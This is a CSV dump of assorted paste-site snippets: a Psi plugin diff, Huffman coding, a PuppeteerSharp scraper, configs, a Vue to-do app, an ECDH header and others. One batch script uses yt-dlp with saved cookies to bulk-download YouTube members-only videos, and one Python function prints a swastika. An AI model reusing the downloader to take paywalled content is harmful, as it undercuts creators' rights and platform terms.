id,title,username,language,date,content
WHCn3YYE,plugin change,KukuRuzo,C++,Sunday 24th of March 2024 04:38:54 AM CDT,"diff --git a/generic/videostatusplugin/videostatusplugin.cpp b/generic/videostatusplugin/videostatusplugin.cpp
index b358aa9..24091a0 100644
--- a/generic/videostatusplugin/videostatusplugin.cpp
+++ b/generic/videostatusplugin/videostatusplugin.cpp
@@ -199,6 +199,10 @@ void VideoStatusChanger::setPsiAccountControllingHost(PsiAccountControllingHost
 
 bool VideoStatusChanger::enable()
 {
+#ifdef HAVE_DBUS
+    if(!X11Info::isPlatformX11())
+        return false;
+#endif
     if (psiOptions) {
         enabled = true;
 #ifdef HAVE_DBUS
diff --git a/generic/videostatusplugin/x11info.cpp b/generic/videostatusplugin/x11info.cpp
index ed8ac1a..727878c 100644
--- a/generic/videostatusplugin/x11info.cpp
+++ b/generic/videostatusplugin/x11info.cpp
@@ -19,6 +19,11 @@
 #include ""x11info.h""
 
 #include <QtGlobal>
+#if QT_VERSION < QT_VERSION_CHECK(6, 0, 0)
+#include <QX11Info>
+#else
+#include <QGuiApplication>
+#endif
 #include <X11/Xlib.h>
 #include <xcb/xcb.h>
 
@@ -48,3 +53,13 @@ xcb_connection_t *X11Info::_xcb = nullptr;
 
 Display *X11Info::_display            = nullptr;
 int      X11Info::_xcbPreferredScreen = 0;
+
+bool X11Info::isPlatformX11()
+{
+#if QT_VERSION < QT_VERSION_CHECK(6, 0, 0)
+    return QX11Info::isPlatformX11();
+#else
+    auto x11app = qApp->nativeInterface<QNativeInterface::QX11Application>();
+    return !!x11app;
+#endif
+}
diff --git a/generic/videostatusplugin/x11info.h b/generic/videostatusplugin/x11info.h
index 650de19..e463699 100644
--- a/generic/videostatusplugin/x11info.h
+++ b/generic/videostatusplugin/x11info.h
@@ -32,6 +32,7 @@ public:
     static unsigned long     appRootWindow(int screen = -1);
     static xcb_connection_t *xcbConnection();
     static inline int        xcbPreferredScreen() { return _xcbPreferredScreen; }
+    static bool isPlatformX11();
 };
 
 #endif // X11INFO_H
"
zsVPvGZu,robloxlocked test,JohnLennonPlays,Lua,Sunday 24th of March 2024 04:37:07 AM CDT,"local instances = LoadAssets(16852495060)

local lemao = instances:Get(""MetaBreakpoint""):Clone()
lemao.Parent = script"
2t5YF7Um,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 04:30:07 AM CDT,"#include <iostream>
#include <queue>
using namespace std;

struct node {
    char value;
    int freq;
    
    node * left,  * right;
    
    node(char _value, int _freq) {
        value = _value;
        freq = _freq;
        left = NULL;
        right = NULL;
    }
};
struct cmp {
    bool operator() (node * n1, node * n2) {
        return (n1->freq > n2->freq);
    }
};
void dfs(node * root, string s) {
    if(!root) {
        return;
    }
    if(root->value != '#') {
        cout << root-> value << "": "" << s << endl;
    }
    dfs(root->left, s + ""0"");
    dfs(root->right, s + ""1"");
}
void huffman_coding(vector<char> chars, vector<int> freq) {
    priority_queue<node *, vector<node *>, cmp> pq;
    for(int i = 0; i < (int) chars.size(); i++) {
        pq.push(new node(chars[i], freq[i]));
    }
    
    while(pq.size() > 1) {
        node * left = pq.top();
        pq.pop();
        
        node * right = pq.top();
        pq.pop();
        
        node * root = new node('#', left->freq + right -> freq);
        root->left = left;
        root->right = right;
        pq.push(root);
    }
    
    dfs(pq.top(), """");
}
int main() {
    ios_base::sync_with_stdio(false);
    int n;
    cin >> n;
    vector<char> chars(n);
    vector<int> freq(n);
    for(int i = 0; i < n; i++) {
        cin >> chars[i] >> freq[i];
    }
    
    huffman_coding(chars, freq);
    return 0;
}
/*
 6
 a 5
 b 9
 c 12
 d 13
 e 16
 f 45
 
 **/
"
sH05xDq1,Untitled,dereksir,C#,Sunday 24th of March 2024 04:22:28 AM CDT,"using PuppeteerSharp;

class Program
{
    static async Task Main(string[] args)
    {
        using var browserFetcher = new BrowserFetcher();
        await browserFetcher.DownloadAsync();

		// launch a new headless browser instance
        await using var browser = await Puppeteer.LaunchAsync(
            new LaunchOptions { Headless = true });
		
		// open a new browser page
        await using var page = await browser.NewPageAsync();

		// navigate to target website
        await page.GoToAsync(""https://scrapeme.live/shop/Pikachu/"");

        // extract product price
        var productPrice = await page.EvaluateExpressionAsync<string>(
            ""document.querySelector('#product-752 > div.summary.entry-summary > p.price > span').innerText"");

        // print the product price
        Console.WriteLine(""Product Price: "" + productPrice);

        // close the browser when done
        await browser.CloseAsync();
    }
}"
uQ562ww1,YouTube メンバ限定動画 ダウンロード,yy981,Winbatch,Sunday 24th of March 2024 03:15:39 AM CDT,"rem ほかのファイルの構成についてはコメントのyoutubeを見てください
@echo off
chcp 65001
setlocal enabledelayedexpansion

rem ""注意書き""
echo.
echo ""！注意！""
echo ""download数が多い場合、パソコンが重くなります。""
echo ""download際に、download数に応じて最小化されたウィンドウが開かれます。閉じないでください。""
echo ""download終了次第、勝手にタブが閉じます。""
echo.

rem ""downloadするURLを取得""
:retry_input
set /p playlist_url=Downloadする動画か、再生リストのURLを入力してください。＞
set ""output_file=URLlist.txt""

rem ""URLによって分岐""
if not ""%playlist_url%""==""%playlist_url:playlist?list=%"" (
yt-dlp ""%playlist_url%"" --flat-playlist --skip-download --get-url --quiet --no-warnings > ""%output_file%""
echo downloadする再生リスト内の動画URLは""%output_file%"" に保存されました。＞
)
if not ""%playlist_url%""==""%playlist_url:watch?v=%"" (
echo %playlist_url% > ""%output_file%""
echo 動画URLは""%output_file%""に保存されました。＞
)

rem ""downloadする画質を設定""
echo.
echo 1は、最高画質
echo 2は、高画質
echo 3は、中画質
echo 4は、低画質
set /p image_quality=downloadする画質の番号を入力してください。＞

if %image_quality% equ 1 (
set ""download_image_quality=best[ext=mp4]+best[ext=mp3]/best[ext=mp4]/best""
echo 最高画質が選択されました。
)
if %image_quality% equ 2 (
set ""download_image_quality=best[ext=mp4]+best[ext=mp3]/best[ext=mp4]/best""
echo 高画質が選択されました。
)
if %image_quality% equ 3 (
set ""download_image_quality=worst[ext=mp4]/best[ext=mp4]/best""
echo 中画質が選択されました。
)
if %image_quality% equ 4 (
set ""download_image_quality=worst[ext=mp4]/best[ext=mp4]/best""
echo 低画質が選択されました。
)

rem ""ファイルを指定""
set ""url_list=URLlist.txt""

rem ""downloadを開始""
for /f ""delims="" %%a in (%url_list%) do (
start /min """" yt-dlp ""%%a"" --cookies cookies.txt --write-thumbnail --embed-thumbnail --add-metadata --write-sub --socket-timeout 30 --download-archive ""finished.txt"" --ignore-errors -f ""%download_image_quality%"" --output ""%output_folder%\%%(upload_date)s-%%(title)s.%%(ext)s"" --retries 3
)

echo ダウンロード待機中
:wait_loop
timeout /t 5 /nobreak >nul
tasklist /fi ""imagename eq yt_dlp.exe"" | find /i ""yt_dlp.exe"" >nul
if (%errorlevel%==1) goto wait_loop

rem ""ファイルの整理の実行""
echo ファイルの整理を実行します。
rem 移動先ファイルを指定
set ""webp_folder=webp""
set ""mp4_folder=mp4""
set ""json_folder=json""
set ""jpg_folder=jpg""

rem フォルダーがなかった場合作成
mkdir ""%webp_folder%"" 2>nul
mkdir ""%mp4_folder%"" 2>nul
mkdir ""%json_folder%"" 2>nul
mkdir ""%jpg_folder%"" 2>nul

rem フォルダに振り分け
move ""*.webp"" ""%webp_folder%\"" 2>nul
move ""*.mp4"" ""%mp4_folder%\"" 2>nul
move ""*.json"" ""%json_folder%\"" 2>nul
move ""*.jpg"" ""%jpg_folder%\"" 2>nul

echo ファイルの移動が完了しました。
pause"
0zx9QYSW,Untitled,mladrad,Python,Sunday 24th of March 2024 03:09:01 AM CDT,"print('Hello SoftUní')
"
HgQ80yKH,Neovim Dashboard Config,Abir-Tx,Lua,Sunday 24th of March 2024 02:38:49 AM CDT,"-- dashboard-nvim settings
require('dashboard').setup {
    theme = 'hyper',
    disable_move = true,
    shortcut_type = 'number',
    change_to_vcs_root = true,
    config = {
        week_header = {
            enable = true,
        },
        shortcut = {
            { desc = '󰊳 Update', group = '@property', action = 'Lazy update', key = 'u' },
            {
                icon = ' ',
                icon_hl = '@variable',
                desc = 'Files',
                group = 'Label',
                action = 'Telescope find_files',
                key = 'f',
            },
            {
                desc = ' Neovim Config',
                group = 'DiagnosticHint',
                action = 'cd ~/.config/nvim | edit init.lua',
                key = 'a',
            },
            {
                desc = ' dotfiles',
                group = 'DiagnosticInfo',
                action = 'Telescope find_files cwd=~/code/github/setup-Aorus-Xtrex/archlinux/',
                key = 'd',
            },
        },
        packages = { enable = true },
        project = { enable = true, limit = 8, icon = ' ', label = 'My Projects', action = 'Telescope find_files cwd=' },
        mru = { limit = 15, icon = ' ', label = 'My Files', cwd_only = false },
    },
}
"
h9QJx64B,swastika,Nenogzar,Python,Sunday 24th of March 2024 01:57:30 AM CDT,"def print_swastika(rows, cols):
    for i in range(rows):
        for j in range(cols):
            if i < rows // 2:
                if j < cols // 2:
                    if j == 0:
                        print(""#"", end="" "")
                    else:
                        print("" "", end="" "")
                elif j == cols // 2:
                    print(""#"", end="" "")
                else:
                    if i == 0:
                        print(""#"", end="" "")
                    else:
                        print("" "", end="" "")
            elif i == rows // 2:
                print(""#"", end="" "")
            else:
                if j > cols // 2:
                    if j == cols - 1:
                        print(""#"", end="" "")
                    else:
                        print("" "", end="" "")
                elif j == cols // 2:
                    print(""#"", end="" "")
                else:
                    if i == rows - 1:
                        print(""#"", end="" "")
                    else:
                        print("" "", end="" "")
        print()

# For correct figure, enter only odd values for column and row
print_swastika(5, 5)"
0DRfyL2P,todo_list_with_notes,Python253,HTML,Sunday 24th of March 2024 12:51:10 AM CDT,"<!--
This script defines a Vue.js application for creating a to-do list with notes.
Users can input new tasks and corresponding notes, view the list of tasks with notes, and delete tasks as needed. 
The application is styled using CSS to provide a visually appealing and user-friendly interface. 
The Vue.js framework is utilized for data binding and DOM manipulation, enabling dynamic updates to the task list without page reloads.
-->
<!DOCTYPE html>
<html lang=""en"">

<head>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
	<title>TO-DO LIST WITH NOTES</title>
	<!-- Importing Vue.js library -->
	<script src=""https://cdn.jsdelivr.net/npm/vue@2""></script>
	<style>
	/* Styling for the entire document */
	
	body {
		font-family: Arial, sans-serif;
		margin: 0;
		padding: 0;
		display: flex;
		justify-content: center;
		align-items: center;
		height: 100vh;
		/* Background gradient */
		background: linear-gradient(-45deg, #000, #000, #191970, #4B0082, #191970, #000, #000);
	}
	/* Styling for the main application container */
	
	#app {
		background-color: #fff;
		padding: 20px;
		border-radius: 8px;
		box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		position: absolute;
		top: 10%;
		left: 10%;
		right: 10%;
		border: 4px solid #000;
		word-wrap: break-word;
		display: flex;
		flex-direction: column;
	}
	/* Styling for headers */
	
	h1,
	strong,
	span {
		text-align: left;
		margin-bottom: 20px;
		font-weight: bold;
	}
	/* Styling for input fields */
	
	input[type=""text""],
	textarea {
		width: calc(100% - 40px);
		padding: 8px;
		border-radius: 4px;
		border: 1px solid #ccc;
		margin-bottom: 10px;
		resize: vertical;
	}
	/* Styling for the to-do list */
	
	ul {
		list-style-type: none;
		padding: 0;
		flex-grow: 1;
		overflow-y: auto;
	}
	
	li {
		display: flex;
		flex-direction: column;
		padding: 8px;
		border-bottom: 1px solid #ccc;
	}
	
	.task {
		margin-bottom: 5px;
		flex-grow: 1;
	}
	/* Styling for buttons */
	
	button {
		background-color: #ff6347;
		color: #fff;
		border: none;
		border-radius: 4px;
		padding: 4px 8px;
		cursor: pointer;
	}
	
	button:hover {
		background-color: #ff473d;
	}
	/* Styling for the submit button */
	
	.submit-btn {
		align-self: flex-end;
	}
	</style>
</head>

<body>
	<!-- Main application container -->
	<div id=""app"">
		<!-- Header -->
		<h1><strong>TO-DO LIST</strong></h1>
		<!-- Input field for adding a new task -->
		<input type=""text"" v-model=""newTodo.task"" placeholder=""ADD A NEW TASK & PRESS [ENTER]..."" @keyup.enter=""focusNotesInput"" ref=""taskInput"">
		<!-- Text area for adding notes -->
		<textarea v-model=""newTodo.note"" placeholder=""ADD NOTES & SELECT [SUBMIT]..."" ref=""notesInput""></textarea>
		<!-- Displaying the list of to-do items -->
		<ul>
			<li v-for=""(todo, index) in todos"" :key=""index"">
				<!-- Displaying the task and a delete button -->
				<div style=""display: flex; align-items: center;""> <strong class=""task"">{{ todo.task }}</strong>
					<button style=""margin-left: 10px;"" @click=""removeTodo(index)"">X</button>
				</div>
				<!-- Displaying notes for the task --><strong>Notes:</strong>
				<br>{{ todo.note }} </li>
		</ul>
		<!-- Submit button -->
		<button class=""submit-btn"" @click=""addTodo"">[SUBMIT]</button>
	</div>
	<!-- Vue.js script -->
	<script>
	// Vue.js instance
	var app = new Vue({
		el: '#app', // Mounting point
		data: {
			// Data for managing to-do items
			newTodo: {
				task: '',
				note: ''
			}, // New to-do item
			todos: [] // List of to-do items
		},
		methods: {
			// Method to add a new to-do item
			addTodo: function() {
				if(this.newTodo.task !== '') {
					this.todos.push({
						task: this.newTodo.task,
						note: this.newTodo.note
					}); // Add new item to the list
					this.newTodo.task = ''; // Clear task input
					this.newTodo.note = ''; // Clear note input
					this.$refs.taskInput.focus(); // Focus on task input
				}
			},
			// Method to remove a to-do item
			removeTodo: function(index) {
				this.todos.splice(index, 1); // Remove item from the list
			},
			// Method to focus on notes input
			focusNotesInput: function() {
				this.$refs.notesInput.focus(); // Focus on notes input
			}
		}
	})
	</script>
</body>

</html>"
smsMaPs6,libs/TinyECDH/ecdh.h,FlyFar,C++,Sunday 24th of March 2024 12:23:39 AM CDT,"/* 

  Crypto using elliptic curves defined over the finite binary field GF(2^m) where m is prime.

  The curves used are the anomalous binary curves (ABC-curves) or also called Koblitz curves.

  This class of curves was chosen because it yields efficient implementation of operations.



  Curves available - their different NIST/SECG names and eqivalent symmetric security level:

      NIST      SEC Group     strength
    ------------------------------------
      K-163     sect163k1      80 bit
      B-163     sect163r2      80 bit
      K-233     sect233k1     112 bit
      B-233     sect233r1     112 bit
      K-283     sect283k1     128 bit
      B-283     sect283r1     128 bit
      K-409     sect409k1     192 bit
      B-409     sect409r1     192 bit
      K-571     sect571k1     256 bit
      B-571     sect571r1     256 bit



  Curve parameters from:

    http://www.secg.org/sec2-v2.pdf
    http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf


  Reference:

    https://www.ietf.org/rfc/rfc4492.txt 
*/

#ifndef _ECDH_H__
#define _ECDH_H__


/* for size-annotated integer types: uint8_t, uint32_t etc. */
#include <stdint.h> 

#ifdef __cplusplus
extern ""C"" {
#endif /* __cplusplus */

#define NIST_B163  1
#define NIST_K163  2
#define NIST_B233  3
#define NIST_K233  4
#define NIST_B283  5
#define NIST_K283  6
#define NIST_B409  7
#define NIST_K409  8
#define NIST_B571  9
#define NIST_K571 10

/* What is the default curve to use? */
#ifndef ECC_CURVE
 #define ECC_CURVE NIST_K571
#endif

#if defined(ECC_CURVE) && (ECC_CURVE != 0)
 #if   (ECC_CURVE == NIST_K163) || (ECC_CURVE == NIST_B163)
  #define CURVE_DEGREE       163
  #define ECC_PRV_KEY_SIZE   24
 #elif (ECC_CURVE == NIST_K233) || (ECC_CURVE == NIST_B233)
  #define CURVE_DEGREE       233
  #define ECC_PRV_KEY_SIZE   32
 #elif (ECC_CURVE == NIST_K283) || (ECC_CURVE == NIST_B283)
  #define CURVE_DEGREE       283
  #define ECC_PRV_KEY_SIZE   36
 #elif (ECC_CURVE == NIST_K409) || (ECC_CURVE == NIST_B409)
  #define CURVE_DEGREE       409
  #define ECC_PRV_KEY_SIZE   52
 #elif (ECC_CURVE == NIST_K571) || (ECC_CURVE == NIST_B571)
  #define CURVE_DEGREE       571
  #define ECC_PRV_KEY_SIZE   72
 #endif
#else
 #error Must define a curve to use
#endif

#define ECC_PUB_KEY_SIZE     (2 * ECC_PRV_KEY_SIZE)


/******************************************************************************/


/* NOTE: assumes private is filled with random data before calling */
int ecdh_generate_keys(uint8_t* public_key, uint8_t* private_key);

/* input: own private key + other party's public key, output: shared secret */
int ecdh_shared_secret(const uint8_t* private_key, const uint8_t* others_pub, uint8_t* output);


/******************************************************************************/

#ifdef __cplusplus
}
#endif /* __cplusplus */

#endif /* #ifndef _ECDH_H__ */
"
